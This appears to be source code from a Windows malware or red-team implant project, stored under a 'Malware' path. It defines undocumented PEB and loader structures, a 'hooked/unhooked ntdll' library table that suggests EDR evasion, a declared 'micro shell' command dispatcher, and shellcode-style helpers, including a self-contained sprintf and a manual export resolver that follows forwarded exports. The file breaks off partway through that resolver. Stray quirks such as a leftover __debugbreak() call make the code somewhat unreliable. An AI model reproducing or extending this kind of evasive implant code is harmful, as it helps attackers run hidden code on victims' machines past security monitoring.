#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <ntstatus.h>

#include "C:\Malware\YetAnotherGate\YetAnotherGate.h"
#include <iostream>
#include <winternl.h>
#include <string>
#include <map>
#include <vector>
#include <sstream>


#pragma comment(lib, "ntdll.lib")

#define PASTE_INTERNAL(a, b) a##b
#define PASTE(a, b) PASTE_INTERNAL(a, b)
#define LOG_W(fmt_literal, ...) \
    do \
    { \
        static const WCHAR PASTE(_fmt_str_, __LINE__)[] = fmt_literal; \
        \
        if(std::wcout) \
        { \
            int written = ShellcodeSprintfW(g_shellcodeLogBuffer, sizeof(g_shellcodeLogBuffer)/sizeof(WCHAR), PASTE(_fmt_str_, __LINE__), ##__VA_ARGS__); \
            if(written >= 0) \
            { \
                std::wcout << g_shellcodeLogBuffer; \
            } else std::wcout << L"LOG_W formatting error or buffer too small."; \
        } \
    } while (0)

#define KUSER_SHARED_DATA_ADDRESS 0x7FFE0000
#define SHARED_DATA_OFFSET_2DC (*(volatile ULONG*)(KUSER_SHARED_DATA_ADDRESS + 0x2DC))

// --------------------------------------------------------------------------------------------

typedef struct _MY_SYSTEM_PROCESS_INFORMATION 
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

//0x18 bytes (sizeof)
struct _MY_CURDIR
{
    struct _UNICODE_STRING DosPath;                                         //0x0
    VOID* Handle;                                                           //0x10
}; 

//0x448 bytes (sizeof)
typedef struct _MY_RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;                                                    //0x0
    ULONG Length;                                                           //0x4
    ULONG Flags;                                                            //0x8
    ULONG DebugFlags;                                                       //0xc
    VOID* ConsoleHandle;                                                    //0x10
    ULONG ConsoleFlags;                                                     //0x18
    VOID* StandardInput;                                                    //0x20
    VOID* StandardOutput;                                                   //0x28
    VOID* StandardError;                                                    //0x30
    struct _MY_CURDIR CurrentDirectory;                                     //0x38
    struct _UNICODE_STRING DllPath;                                         //0x50
    struct _UNICODE_STRING ImagePathName;                                   //0x60
    struct _UNICODE_STRING CommandLine;                                     //0x70
    VOID* Environment;                                                      //0x80
    ULONG StartingX;                                                        //0x88
    ULONG StartingY;                                                        //0x8c
    ULONG CountX;                                                           //0x90
    ULONG CountY;                                                           //0x94
    ULONG CountCharsX;                                                      //0x98
    ULONG CountCharsY;                                                      //0x9c
    ULONG FillAttribute;                                                    //0xa0
    ULONG WindowFlags;                                                      //0xa4
    ULONG ShowWindowFlags;                                                  //0xa8
    struct _UNICODE_STRING WindowTitle;                                     //0xb0
    struct _UNICODE_STRING DesktopInfo;                                     //0xc0
    struct _UNICODE_STRING ShellInfo;                                       //0xd0
    struct _UNICODE_STRING RuntimeData;                                     //0xe0
    //struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];                  //0xf0
    ULONGLONG EnvironmentSize;                                              //0x3f0
    ULONGLONG EnvironmentVersion;                                           //0x3f8
    VOID* PackageDependencyData;                                            //0x400
    ULONG ProcessGroupId;                                                   //0x408
    ULONG LoaderThreads;                                                    //0x40c
    struct _UNICODE_STRING RedirectionDllName;                              //0x410
    struct _UNICODE_STRING HeapPartitionName;                               //0x420
    ULONGLONG* DefaultThreadpoolCpuSetMasks;                                //0x430
    ULONG DefaultThreadpoolCpuSetMaskCount;                                 //0x438
    ULONG DefaultThreadpoolThreadMaximum;                                   //0x43c
    ULONG HeapMemoryTypeMask;                                               //0x440
} MY_RTL_USER_PROCESS_PARAMETERS, *PMY_RTL_USER_PROCESS_PARAMETERS; 

//0x7d0 bytes (sizeof)
typedef struct _MY_PEB
{
    UCHAR InheritedAddressSpace;                                            //0x0
    UCHAR ReadImageFileExecOptions;                                         //0x1
    UCHAR BeingDebugged;                                                    //0x2
    union
    {
        UCHAR BitField;                                                     //0x3
        struct
        {
            UCHAR ImageUsesLargePages:1;                                    //0x3
            UCHAR IsProtectedProcess:1;                                     //0x3
            UCHAR IsImageDynamicallyRelocated:1;                            //0x3
            UCHAR SkipPatchingUser32Forwarders:1;                           //0x3
            UCHAR IsPackagedProcess:1;                                      //0x3
            UCHAR IsAppContainer:1;                                         //0x3
            UCHAR IsProtectedProcessLight:1;                                //0x3
            UCHAR IsLongPathAwareProcess:1;                                 //0x3
        };
    };
    UCHAR Padding0[4];                                                      //0x4
    VOID* Mutant;                                                           //0x8
    VOID* ImageBaseAddress;                                                 //0x10
    struct _PEB_LDR_DATA* Ldr;                                              //0x18
    struct _MY_RTL_USER_PROCESS_PARAMETERS* ProcessParameters;              //0x20
    VOID* SubSystemData;                                                    //0x28
    VOID* ProcessHeap;                                                      //0x30
    struct _RTL_CRITICAL_SECTION* FastPebLock;                              //0x38
    union _SLIST_HEADER* volatile AtlThunkSListPtr;                         //0x40
    VOID* IFEOKey;                                                          //0x48
    union
    {
        ULONG CrossProcessFlags;                                            //0x50
        struct
        {
            ULONG ProcessInJob:1;                                           //0x50
            ULONG ProcessInitializing:1;                                    //0x50
            ULONG ProcessUsingVEH:1;                                        //0x50
            ULONG ProcessUsingVCH:1;                                        //0x50
            ULONG ProcessUsingFTH:1;                                        //0x50
            ULONG ProcessPreviouslyThrottled:1;                             //0x50
            ULONG ProcessCurrentlyThrottled:1;                              //0x50
            ULONG ProcessImagesHotPatched:1;                                //0x50
            ULONG ReservedBits0:24;                                         //0x50
        };
    };
    UCHAR Padding1[4];                                                      //0x54
    union
    {
        VOID* KernelCallbackTable;                                          //0x58
        VOID* UserSharedInfoPtr;                                            //0x58
    };
    ULONG SystemReserved;                                                   //0x60
    ULONG AtlThunkSListPtr32;                                               //0x64
    VOID* ApiSetMap;                                                        //0x68
    ULONG TlsExpansionCounter;                                              //0x70
    UCHAR Padding2[4];                                                      //0x74
    struct _RTL_BITMAP* TlsBitmap;                                          //0x78
    ULONG TlsBitmapBits[2];                                                 //0x80
    VOID* ReadOnlySharedMemoryBase;                                         //0x88
    VOID* SharedData;                                                       //0x90
    VOID** ReadOnlyStaticServerData;                                        //0x98
    VOID* AnsiCodePageData;                                                 //0xa0
    VOID* OemCodePageData;                                                  //0xa8
    VOID* UnicodeCaseTableData;                                             //0xb0
    ULONG NumberOfProcessors;                                               //0xb8
    ULONG NtGlobalFlag;                                                     //0xbc
    union _LARGE_INTEGER CriticalSectionTimeout;                            //0xc0
    ULONGLONG HeapSegmentReserve;                                           //0xc8
    ULONGLONG HeapSegmentCommit;                                            //0xd0
    ULONGLONG HeapDeCommitTotalFreeThreshold;                               //0xd8
    ULONGLONG HeapDeCommitFreeBlockThreshold;                               //0xe0
    ULONG NumberOfHeaps;                                                    //0xe8
    ULONG MaximumNumberOfHeaps;                                             //0xec
    VOID** ProcessHeaps;                                                    //0xf0
    VOID* GdiSharedHandleTable;                                             //0xf8
    VOID* ProcessStarterHelper;                                             //0x100
    ULONG GdiDCAttributeList;                                               //0x108
    UCHAR Padding3[4];                                                      //0x10c
    struct _RTL_CRITICAL_SECTION* LoaderLock;                               //0x110
    ULONG OSMajorVersion;                                                   //0x118
    ULONG OSMinorVersion;                                                   //0x11c
    USHORT OSBuildNumber;                                                   //0x120
    USHORT OSCSDVersion;                                                    //0x122
    ULONG OSPlatformId;                                                     //0x124
    ULONG ImageSubsystem;                                                   //0x128
    ULONG ImageSubsystemMajorVersion;                                       //0x12c
    ULONG ImageSubsystemMinorVersion;                                       //0x130
    UCHAR Padding4[4];                                                      //0x134
    ULONGLONG ActiveProcessAffinityMask;                                    //0x138
    ULONG GdiHandleBuffer[60];                                              //0x140
    VOID (*PostProcessInitRoutine)();                                       //0x230
    struct _RTL_BITMAP* TlsExpansionBitmap;                                 //0x238
    ULONG TlsExpansionBitmapBits[32];                                       //0x240
    ULONG SessionId;                                                        //0x2c0
    UCHAR Padding5[4];                                                      //0x2c4
    union _ULARGE_INTEGER AppCompatFlags;                                   //0x2c8
    union _ULARGE_INTEGER AppCompatFlagsUser;                               //0x2d0
    VOID* pShimData;                                                        //0x2d8
    VOID* AppCompatInfo;                                                    //0x2e0
    struct _UNICODE_STRING CSDVersion;                                      //0x2e8
    struct _ACTIVATION_CONTEXT_DATA* ActivationContextData;                 //0x2f8
    struct _ASSEMBLY_STORAGE_MAP* ProcessAssemblyStorageMap;                //0x300
    struct _ACTIVATION_CONTEXT_DATA* SystemDefaultActivationContextData;    //0x308
    struct _ASSEMBLY_STORAGE_MAP* SystemAssemblyStorageMap;                 //0x310
    ULONGLONG MinimumStackCommit;                                           //0x318
    VOID* SparePointers[2];                                                 //0x320
    VOID* PatchLoaderData;                                                  //0x330
    struct _CHPEV2_PROCESS_INFO* ChpeV2ProcessInfo;                         //0x338
    ULONG AppModelFeatureState;                                             //0x340
    ULONG SpareUlongs[2];                                                   //0x344
    USHORT ActiveCodePage;                                                  //0x34c
    USHORT OemCodePage;                                                     //0x34e
    USHORT UseCaseMapping;                                                  //0x350
    USHORT UnusedNlsField;                                                  //0x352
    VOID* WerRegistrationData;                                              //0x358
    VOID* WerShipAssertPtr;                                                 //0x360
    VOID* EcCodeBitMap;                                                     //0x368
    VOID* pImageHeaderHash;                                                 //0x370
    union
    {
        ULONG TracingFlags;                                                 //0x378
        struct
        {
            ULONG HeapTracingEnabled:1;                                     //0x378
            ULONG CritSecTracingEnabled:1;                                  //0x378
            ULONG LibLoaderTracingEnabled:1;                                //0x378
            ULONG SpareTracingBits:29;                                      //0x378
        };
    };
    UCHAR Padding6[4];                                                      //0x37c
    ULONGLONG CsrServerReadOnlySharedMemoryBase;                            //0x380
    ULONGLONG TppWorkerpListLock;                                           //0x388
    struct _LIST_ENTRY TppWorkerpList;                                      //0x390
    VOID* WaitOnAddressHashTable[128];                                      //0x3a0
    VOID* TelemetryCoverageHeader;                                          //0x7a0
    ULONG CloudFileFlags;                                                   //0x7a8
    ULONG CloudFileDiagFlags;                                               //0x7ac
    CHAR PlaceholderCompatibilityMode;                                      //0x7b0
    CHAR PlaceholderCompatibilityModeReserved[7];                           //0x7b1
    struct _LEAP_SECOND_DATA* LeapSecondData;                               //0x7b8
    union
    {
        ULONG LeapSecondFlags;                                              //0x7c0
        struct
        {
            ULONG SixtySecondEnabled:1;                                     //0x7c0
            ULONG Reserved:31;                                              //0x7c0
        };
    };
    ULONG NtGlobalFlag2;                                                    //0x7c4
    ULONGLONG ExtendedFeatureDisableMask;                                   //0x7c8
} MY_PEB, *PMY_PEB; 

typedef struct _FILE_BOTH_DIR_INFORMATION
{
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    CCHAR         ShortNameLength;
    WCHAR         ShortName[12];
    WCHAR         FileName[1]; // Variable length
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

struct _LIBS
{
    HMODULE hHookedNtdll;
    HMODULE hUnhookedNtdll;
    HMODULE hKERNEL32;
    HMODULE hKERNELBASE;
    HMODULE hUsr32;
}sLibs_shell;

typedef struct _MY_PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    PVOID  SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *MY_PPEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;  

//typedef struct _CURDIR_REF
//{
//    LONG   ReferenceCount;         // 0x00: Reference Count (*_DWORD = 1)
//    HANDLE Handle;                 // 0x08: Directory Handle
//    PVOID  Unknown1;               // 0x10: KUSER_SHARED_DATA value
//    ULONG  Padding1;               // 0x14: Alignment
//    USHORT Length;                 // 0x18: Current string length
//    USHORT MaximumLength;          // 0x1A: Max buffer length
//    ULONG  Padding2;               // 0x1C: Alignment
//    PWSTR  Buffer;                 // 0x20: Pointer to the string
//    ULONG  DeviceCharacteristics;  // 0x28: From ZwQueryVolumeInformationFile
//    ULONG  Padding3;               // 0x2C: Alignment
//    // WCHAR Path[ANYSIZE_ARRAY];  // 0x30 (48): Appended path buffer
//} CURDIR_REF, *PCURDIR_REF;

typedef struct _CURDIR_REF
{
    LONG ReferenceCount;         // 0x00
    HANDLE Handle;               // 0x08
    PVOID Unknown1;              // 0x10
    UNICODE_STRING DosPath;      // 0x18
    PVOID PaddingTo30;           // 0x28 (Forces struct to 48 bytes)
} CURDIR_REF, *PCURDIR_REF;

typedef struct _FILE_FS_DEVICE_INFORMATION
{
  DEVICE_TYPE DeviceType;
  ULONG       Characteristics;
} FILE_FS_DEVICE_INFORMATION, *PFILE_FS_DEVICE_INFORMATION;

typedef enum _FSINFOCLASS
{
  FileFsVolumeInformation,
  FileFsLabelInformation,
  FileFsSizeInformation,
  FileFsDeviceInformation,
  FileFsAttributeInformation,
  FileFsControlInformation,
  FileFsFullSizeInformation,
  FileFsObjectIdInformation,
  FileFsDriverPathInformation,
  FileFsVolumeFlagsInformation,
  FileFsSectorSizeInformation,
  FileFsDataCopyInformation,
  FileFsMetadataSizeInformation,
  FileFsFullSizeInformationEx,
  FileFsGuidInformation,
  FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;

// --------------------------------------------------------------------------------------------

typedef std::wstring (*CommandRoutine)(const std::wstring& args);
typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);


typedef NTSTATUS(NTAPI* pfnRtlInitUnicodeStringEx)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef PVOID(NTAPI* pfnRtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
typedef BOOL(NTAPI* pfnRtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
typedef VOID(NTAPI* pfnRtlCopyUnicodeString)(PUNICODE_STRING  DestinationString, PCUNICODE_STRING SourceString);
typedef PVOID(NTAPI* pfnRtlAcquirePebLock)(VOID);
typedef PVOID(NTAPI* pfnRtlReleasePebLock)(VOID);
typedef NTSTATUS(NTAPI* pfnRtlGetFullPathName_UstrEx)(PUNICODE_STRING FileName, PUNICODE_STRING StaticString, PUNICODE_STRING DynamicString, PUNICODE_STRING *StringUsed, PSIZE_T FilePartPrefixCch, PBOOLEAN NameInvalid, PULONG InputPathType,PSIZE_T BytesRequired);
typedef NTSTATUS(NTAPI* pfnRtlDosPathNameToNtPathName_U_WithStatus)(PWSTR DosFileName, PUNICODE_STRING NtFileName, PWSTR *FilePart, PVOID RelativeName);
// --------------------------------------------------------------------------------------------

std::wstring static ExecuteMicroShell(std::wstring input_command);

// --------------------------------------------------------------------------------------------

#pragma region Globals

std::map<std::wstring, CommandRoutine> g_CommandMap;

static const WCHAR g_hexChars[] = L"0123456789ABCDEF";
static WCHAR g_shellcodeLogBuffer[256];

pfnLoadLibraryA my_LoadLibraryA = nullptr;
pfnRtlInitUnicodeStringEx my_RtlInitUnicodeStringEx = nullptr;
pfnRtlAllocateHeap my_RtlAllocateHeap = nullptr;
pfnRtlFreeHeap my_RtlFreeHeap = nullptr;
pfnRtlCopyUnicodeString my_RtlCopyUnicodeString = nullptr;
pfnRtlAcquirePebLock my_RtlAcquirePebLock = nullptr;
pfnRtlReleasePebLock my_RtlReleasePebLock = nullptr;
pfnRtlGetFullPathName_UstrEx my_RtlGetFullPathName_UstrEx = nullptr;
pfnRtlDosPathNameToNtPathName_U_WithStatus my_RtlDosPathNameToNtPathName_U_WithStatus = nullptr;

#pragma endregion

// --------------------------------------------------------------------------------------------

#pragma region Helpers

static void __stdcall HelperSplitFilename(const WCHAR* full, SIZE_T fullLen, const WCHAR** outName, SIZE_T* outLen)
{
    SIZE_T i = fullLen;
    while(i > 0)
    {
        WCHAR c = full[i - 1];
        if(c == L'\\' || c == L'/') break;
        --i;
    }
    *outName = full + i;
    *outLen  = fullLen - i;
}

static bool __stdcall isSame(const char* a, const char* b)
{
    while(*a && *b)
    {
        char ca = *a, cb = *b;
        if(ca >= 'A' && ca <= 'Z') ca += ('a' - 'A');
        if(cb >= 'A' && cb <= 'Z') cb += ('a' - 'A');
        if(ca != cb) return false;
        ++a; ++b;
    }
    return (*a == '\0' && *b == '\0');
}

static bool __stdcall isSameW(const WCHAR* a, const WCHAR* b, SIZE_T len)
{
    for(SIZE_T i = 0; i < len; i++)
    {
        WCHAR ca = a[i], cb = b[i];
        // tolower for ASCII A–Z
        if(ca >= L'A' && ca <= L'Z') ca += 32;
        if(cb >= L'A' && cb <= L'Z') cb += 32;
        if(ca != cb) return false;
    }
    return true;
}

static WCHAR* __stdcall UllToHexW(unsigned __int64 val, WCHAR* buf_end, int max_chars)
{
    // Helper to convert unsigned long long to hex string
    // Writes to buffer from right to left, returns pointer to start of written string in buffer
    if(max_chars <= 0) return buf_end;
        
    WCHAR* p = buf_end;
    *p = L'\0';
    if(val == 0 && max_chars > 0)
    {
        --p;
        *p = L'0';
            
        return p;
    }
    int count = 0;
    while(val > 0 && count < max_chars)
    {
        --p;
        *p = g_hexChars[val & 0xF];
        val >>= 4;
        count++;
    }
    return p;
}

static WCHAR* __stdcall IntToDecW(int val, WCHAR* buf_end, int max_chars)
{
    // Helper to convert integer to decimal string
    // Writes to buffer from right to left, returns pointer to start of written string in buffer
    if(max_chars <= 0) return buf_end;

    WCHAR* p = buf_end;
    *p = L'\0';
    if(val == 0 && max_chars > 0)
    {
        --p;
        *p = L'0';
            
        return p;
    }
        
    bool negative = false;
    if(val < 0)
    {
        negative = true;
        val = -val;                             // Make positive, careful with INT_MIN
        if(val < 0)
        {   
            // Overflow for INT_MIN
            // Handle INT_MIN specifically if needed, or just let it be large positive
        }
    }

    int count = 0;
    while(val > 0 && count < max_chars)
    {
        --p;
        *p = L'0' + (val % 10);
        val /= 10;
        count++;
    }
    if(negative && count < max_chars)
    {
        --p;
        *p = L'-';
    }
    return p;
}

static int __cdecl ShellcodeSprintfW(LPWSTR pszDest, size_t cchDest, LPCWSTR pszFormat, ...)
{
    // * Supported format specifiers:
    // * - %s  : Wide string (LPCWSTR)
    // * - %hs : ANSI string (LPCSTR)
    // * - %p  : Pointer value in hex
    // * - %X  : Unsigned int in hex
    // * - %hX : Unsigned short in hex 
    // * - %hx : Unsigned short in hex (lowercase)
    // * - %d  : Signed int in decimal
    // * - %%  : Literal percent sign
    // Returns number of characters written (excluding null terminator), or -1 on error/truncation
        
    if(!pszDest || !pszFormat || cchDest == 0) return -1;

    LPWSTR pDest = pszDest;
    LPCWSTR pFmt = pszFormat;
    size_t remaining = cchDest -1;      // Space for null terminator

    va_list args;
    va_start(args, pszFormat);

    WCHAR tempNumBuf[24];               // Buffer for number to string conversions (e.g., 64-bit hex + null)

    while(*pFmt && remaining > 0)
    {
        if(*pFmt == L'%')
        {
            pFmt++;

            switch(*pFmt)
            {
                case L's': // Wide string
                {
                    LPCWSTR str_arg = va_arg(args, LPCWSTR);
                    if(!str_arg) str_arg = L"(null)";
                    while(*str_arg && remaining > 0)
                    {
                        *pDest++ = *str_arg++;
                        remaining--;
                    }
                    break;
                }

                case L'h': // Potentially char* string OR short hex/dec
                    if(*(pFmt + 1) == L's')
                    { // %hs
                        pFmt++; // consume 's'
                        LPCSTR str_arg_a = va_arg(args, LPCSTR);
                        if(!str_arg_a) str_arg_a = "(null)"; // or some other indicator
                        while(*str_arg_a && remaining > 0)
                        {
                            *pDest++ = (WCHAR)(*str_arg_a++);
                            remaining--;
                        }
                    } 
                    else if(*(pFmt + 1) == L'X' || *(pFmt + 1) == L'x') 
                    { // %hX or %hx
                        pFmt++; // consume 'X' or 'x'
                        // Arguments smaller than int are promoted to int when passed via va_arg
                        unsigned short val_short_arg = (unsigned short)va_arg(args, unsigned int);
                        WCHAR* num_str_start = UllToHexW(val_short_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                        while(*num_str_start && remaining > 0)
                        {
                            *pDest++ = *num_str_start++;
                            remaining--;
                        }
                    }
                    // else if(*(pFmt + 1) == L'u') // handle %hu
                    // {
                    //     pFmt++; // consume 'u'
                    //     unsigned short val = (unsigned short)va_arg(args, unsigned int);
                    //     WCHAR* num_str_start = IntToDecW(val, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR) - 1), (sizeof(tempNumBuf)/sizeof(WCHAR) - 1));
                    //     while (*num_str_start && remaining > 0)
                    //     {
                    //         *pDest++ = *num_str_start++;
                    //         remaining--;
                    //     }
                    // }
                    // Add %hd for short decimal if needed
                    // else if(*(pFmt + 1) == L'd') { /* ... */ }
                    else
                    { // Not 'hs' or 'hX', treat as literal 'h'
                        if(remaining > 0) { *pDest++ = L'%'; remaining--; } // Re-emit the %
                        if(remaining > 0) { *pDest++ = L'h'; remaining--; } // Emit the h
                        // The character that was after 'h' (which wasn't s, X, or x) will be processed in the next loop iteration
                    }
                break;

                case L'p': // Pointer (hex) - uses unsigned __int64 for UllToHexW
                {
                    unsigned __int64 val_ptr_arg = (unsigned __int64)va_arg(args, void*);
                    WCHAR* num_str_start = UllToHexW(val_ptr_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                    while(*num_str_start && remaining > 0)
                    {
                        *pDest++ = *num_str_start++;
                        remaining--;
                    }
                    break;
                }

                case L'X': // Hex unsigned int (can be extended for %llX for 64-bit)
                {
                    unsigned __int64 val_arg;
                    if(*pFmt == L'p') val_arg = (unsigned __int64)va_arg(args, void*);
                    else val_arg = (unsigned __int64)va_arg(args, unsigned int); // Promote to 64-bit for UllToHexW

                    WCHAR* num_str_start = UllToHexW(val_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                    while(*num_str_start && remaining > 0)
                    {
                        *pDest++ = *num_str_start++;
                        remaining--;
                    }
                    break;
                }
                    
                case L'd': // Integer (decimal)
                {
                    int val_arg = va_arg(args, int);
                        
                    WCHAR* num_str_start = IntToDecW(val_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                    while(*num_str_start && remaining > 0)
                    {
                        *pDest++ = *num_str_start++;
                        remaining--;
                    }
                    break;
                }
                    
                case L'%': // Literal percent
                {                        __debugbreak();
                    if(remaining > 0) { *pDest++ = L'%'; remaining--; }
                    break;
                }
                        
                default: // Unknown format specifier, print literally
                {
                    if(remaining > 0) { *pDest++ = L'%'; remaining--; }
                    if(*pFmt && remaining > 0) { *pDest++ = *pFmt; remaining--; } // Print the char after %
                    break;
                }
            }
        } 
        else 
        {
            *pDest++ = *pFmt;
            remaining--;
        }
        if(*pFmt) pFmt++; // Move to next format char if not end of string
    }

    va_end(args);
    *pDest = L'\0'; // Null terminate

    if(*pFmt != L'\0') return -1; // Format string not fully processed (ran out of buffer)
    return (int)(pDest - pszDest); // Number of characters written
}

static void* __stdcall ShellcodeFindExportAddress(HMODULE hModule, LPCSTR lpProcNameOrOrdinal, pfnLoadLibraryA pLoadLibraryAFunc)
{
    //-----------

    if(!hModule) return nullptr;

    BYTE* base = (BYTE*)hModule;
        
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    IMAGE_DATA_DIRECTORY* pExportDataDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; // Use a pointer for clarity
    if(pExportDataDir->VirtualAddress == 0 || pExportDataDir->Size == 0) return nullptr;

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + pExportDataDir->VirtualAddress);
    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions); // RVAs to function bodies or forwarders

    //-----------

    // --- DIFFERENTIATE NAME VS ORDINAL ---
    bool isOrdinalLookup = false;
    WORD ordinalToFind = 0;

    #if defined(_WIN64)
        if(((ULONG_PTR)lpProcNameOrOrdinal >> 16) == 0)    // High bits of pointer are zero
        {
            isOrdinalLookup = true;
            ordinalToFind = LOWORD((ULONG_PTR)lpProcNameOrOrdinal);
        }
    #else // For 32-bit shellcode
        // For 32-bit, HIWORD macro is on a DWORD. ULONG_PTR might be 64-bit if compiled for x64 targeting x86.
        // Ensure lpProcNameOrOrdinal is treated as a 32-bit value for HIWORD.
        if(HIWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal) == 0)
        { 
            isOrdinalLookup = true;
            ordinalToFind = LOWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal);
        }
    #endif
    // --- END DIFFERENTIATION LOGIC ---

    DWORD funcRVA = 0; // RVA of the function/forwarder

    if(isOrdinalLookup)
    {
        if(ordinalToFind < exp->Base || (ordinalToFind - exp->Base) >= exp->NumberOfFunctions)
        {
            LOG_W(L"    [SFEA] Ordinal %hu is out of range (Base: %u, NumberOfFunctions: %u)", ordinalToFind, exp->Base, exp->NumberOfFunctions);
            return nullptr;
        }
            
        DWORD functionIndexInArray = ordinalToFind - exp->Base;
        if(functionIndexInArray >= exp->NumberOfFunctions) return nullptr;
            
        funcRVA = functions[functionIndexInArray];
    }
    else
    {
        // --- NAME LOOKUP PATH ---
        LPCSTR funcName = lpProcNameOrOrdinal;
        if(!funcName || *funcName == '\0') return nullptr;

        DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);          // RVAs to ASCII name strings
        WORD* nameOrdinals = (WORD*)(base + exp->AddressOfNameOrdinals); // Indices into the 'functions' array (NOT necessarily the export ordinals themselves)

        bool foundByName = false;
        for (DWORD i = 0; i < exp->NumberOfNames; ++i)
        {
            char* currentExportName = (char*)(base + nameRVAs[i]);
            
            if(isSame(currentExportName, funcName)) 
            {
                WORD functionIndexInArray = nameOrdinals[i];            //index into the 'functions' array
            
                // Bounds check for the index obtained from nameOrdinals
                if(functionIndexInArray >= exp->NumberOfFunctions)
                {
                    LOG_W(L"Name '%hs' gave an ordinal array index %hu out of bounds (%u).", funcName, functionIndexInArray, exp->NumberOfFunctions);
                    return nullptr;
                }

                funcRVA = functions[functionIndexInArray];
                if(funcRVA == 0) return nullptr; // Should not happen for a named export pointing to a valid index

                foundByName = true;
                break;
            }
        }
        
        if(!foundByName)
        {
            LOG_W(L"Name '%hs' not found in export table.", funcName);
            return nullptr;
        }
    }

    if(funcRVA == 0)
    {
        LOG_W(L"RVA for %p in module 0x%p is zero.", lpProcNameOrOrdinal, hModule);
        return nullptr; // No valid RVA found
    } 

    BYTE* addr = base + funcRVA;

    // Check if this RVA points within the export directory itself (indicates a forwarded export)
    if(funcRVA >= pExportDataDir->VirtualAddress && funcRVA < (pExportDataDir->VirtualAddress + pExportDataDir->Size)) 
    {
        // This is a forwarder string like "OTHERDLL.OtherFunction" or "OTHERDLL.#123" 
        char* originalForwarderString = (char*)addr; // The RVA points to this string
        LOG_W(L"    [SFEA] Proc %p from module 0x%p is forwarded to: '%hs'", lpProcNameOrOrdinal, hModule, originalForwarderString);

        if(!pLoadLibraryAFunc)
        {
            LOG_W(L"    [SFEA] pLoadLibraryAFunc is nullptr, cannot resolve forwarder for %hs", originalForwarderString);
            return nullptr;
        }

        // --- PARSING: Work with a local, writable copy ---
        char localForwarderBuffer[256];
        UINT k_copy = 0;
            
        char* pOrig = originalForwarderString;
        while (*pOrig != '\0' && k_copy < (sizeof(localForwarderBuffer) - 1))
        {
            localForwarderBuffer[k_copy++] = *pOrig++;
        }
        localForwarderBuffer[k_copy] = '\0';


        char* dotSeparatorInLocal = nullptr;
        char* tempParserPtr = localForwarderBuffer;

        while (*tempParserPtr != '\0') 
        {
            if(*tempParserPtr == '.')
            {
                dotSeparatorInLocal = tempParserPtr;
                break;
            }
            ++tempParserPtr;
        }
        if(!dotSeparatorInLocal || dotSeparatorInLocal == localForwarderBuffer) { LOG_W(L"    [SFEA] Malformed forwarder string (in copy): '%hs'", localForwarderBuffer); return nullptr; }


        *dotSeparatorInLocal = '\0'; 
        char* forwardedFuncNameOrOrdinalStr = dotSeparatorInLocal + 1;
        if(*forwardedFuncNameOrOrdinalStr == '\0') { LOG_W(L"    [SFEA] Malformed forwarder string (nothing after dot in copy): '%hs'", localForwarderBuffer); return nullptr; }
            
        char* forwardedDllName = localForwarderBuffer;
        HMODULE hForwardedModule = pLoadLibraryAFunc(forwardedDllName);
        if(!hForwardedModule)
        {
            LOG_W(L"    [SFEA] Failed to load forwarded DLL: '%hs' (original forwarder was: '%hs')", forwardedDllName, originalForwarderString);
            return nullptr;
        }

